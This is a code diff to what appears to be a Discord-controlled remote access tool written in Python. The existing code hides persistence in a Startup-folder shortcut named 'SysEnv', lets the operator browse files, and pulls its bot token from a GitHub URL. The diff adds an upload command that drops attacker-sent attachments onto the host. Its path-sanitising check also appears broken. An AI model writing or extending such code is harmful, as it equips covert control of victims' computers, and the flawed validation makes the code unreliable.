@@ -45,7 +45,23 @@ startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu
 shortcut_name="SysEnv"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 
+BASE_DIR = Path("./user_uploads")  # Base storage directory
+MAX_SIZE = 10 * 1024 * 1024  # 10MB
+PENDING_DIRS = {}
+
 CHANNEL_ID = 1355560563622678699
+
+
+def sanitize_path(user_path: str) -> Path:
+    """Sanitize and validate user-provided path"""
+    # Remove any potential path traversal
+    clean_path = Path(BASE_DIR / user_path.lstrip("/")).resolve()
+    
+    # Ensure the path remains within BASE_DIR
+    if not clean_path.is_relative_to(BASE_DIR):
+        raise ValueError("Invalid path specified")
+    
+    return clean_path
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
@@ -732,6 +748,85 @@ async def browse(interaction: nextcord.Interaction):
         initial_path = None if os.name == 'nt' else '/'
         view = FileView(initial_path, [])
         await interaction.response.send_message("Browse files:", view=view)
+
+@client.slash_command(name="upload", description="Start file upload process")
+async def upload(
+    interaction: Interaction,
+    directory: str = nextcord.SlashOption(description="Target directory path")
+):
+    try:
+        # Sanitize and validate path
+        target_dir = sanitize_path(directory)
+        target_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Store pending directory with timeout
+        PENDING_DIRS[interaction.user.id] = target_dir
+        await interaction.response.send_message(
+            f"📁 Ready to receive files in `{target_dir}`. Please upload your file within 2 minutes.",
+            ephemeral=False
+        )
+        
+        # Set timeout to clear pending directory
+        await asyncio.sleep(120)
+        if interaction.user.id in PENDING_DIRS:
+            del PENDING_DIRS[interaction.user.id]
+            await interaction.followup.send(
+                "⌛ Upload session timed out", 
+                ephemeral=False
+            )
+
+    except Exception as e:
+        await interaction.response.send_message(
+            f"❌ Error: {str(e)}",
+            ephemeral=False
+        )
+
+@client.event
+async def on_message(message):
+    # Ignore bot messages and messages without attachments
+    if message.author.bot or not message.attachments:
+        return
+
+    user_id = message.author.id
+    if user_id not in PENDING_DIRS:
+        return
+
+    target_dir = PENDING_DIRS[user_id]
+    del PENDING_DIRS[user_id]  # Clear pending state
+
+    try:
+        saved_files = []
+        for attachment in message.attachments:
+            # Validate file size
+            if attachment.size > MAX_SIZE:
+                raise ValueError(f"{attachment.filename} exceeds 10MB limit")
+
+            # Create target path
+            file_path = target_dir / attachment.filename
+            
+            # Save file
+            await attachment.save(file_path)
+            saved_files.append(attachment.filename)
+
+        # Create success response
+        embed = nextcord.Embed(
+            title="✅ Upload Successful",
+            description=f"Saved {len(saved_files)} files to:\n`{target_dir}`",
+            color=nextcord.Color.green()
+        )
+        embed.add_field(
+            name="Uploaded Files",
+            value="\n".join(saved_files),
+            inline=False
+        )
+        
+        await message.reply(embed=embed, mention_author=False)
+
+    except Exception as e:
+        await message.reply(
+            f"❌ Upload failed: {str(e)}",
+            mention_author=False
+        )
 
 print("Getting token")
 r = requests.get("https://raw.githubusercontent.com/skibidi-123456/skibidi/refs/heads/info/token")
